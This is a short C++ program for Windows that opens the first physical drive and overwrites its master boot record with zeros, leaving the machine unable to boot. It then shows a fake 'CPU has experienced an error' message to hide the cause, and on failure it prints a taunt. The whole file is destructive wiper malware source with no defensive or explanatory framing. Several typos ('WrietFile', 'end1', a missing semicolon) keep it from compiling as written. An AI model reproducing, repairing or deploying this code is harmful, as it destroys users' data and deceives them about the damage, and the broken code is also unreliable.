#include <Windows.h>
#include <iostream>

using namespace std;

#define MBR_SIZE 512
int main()
{
	DWORD write;
	char mbrData[MBR_SIZE];
	ZeroMemory(&mbrData, (sizeof mbrData));

	HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0"
		, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
		, NULL, OPEN_EXISTING, NULL, NULL)

		if (WrietFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
			cout << "The CPU has experienced an error. Restart your machine to resolve this issue." << end1;
			Sleep(5000);
			ExitProcess(0);
		}
		else {
			cout << "you got lucky son!";
			Sleep(5000);
			ExitProcess(0);
		}
	CloseHandle(MasterBootRecord);

	return EXIT_SUCCESS;

}